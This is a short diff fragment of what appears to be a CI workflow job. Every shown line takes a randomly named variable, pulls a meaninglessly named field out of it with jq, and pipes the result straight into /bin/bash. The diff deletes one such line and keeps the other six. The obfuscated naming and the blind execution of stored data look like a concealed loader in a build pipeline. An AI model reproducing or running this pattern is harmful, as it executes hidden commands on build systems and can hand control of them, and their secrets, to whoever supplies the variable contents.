@@ -24,7 +24,6 @@ jobs:
           printf '%s' "$cna1893" | jq -r .pe0 | /bin/bash
           echo $gxchb67 | jq -r .nq0 | /bin/bash
           printf '%s' "$ldc9" | jq -r .dmh9986 | /bin/bash
-          echo $r67032 | jq -r .n98 | /bin/bash
           echo $qn06 | jq -r .xlr86 | /bin/bash
           echo $d73 | jq -r .bvdo972 | /bin/bash
           printf '%s' "$bve0124" | jq -r .mkw3 | /bin/bash
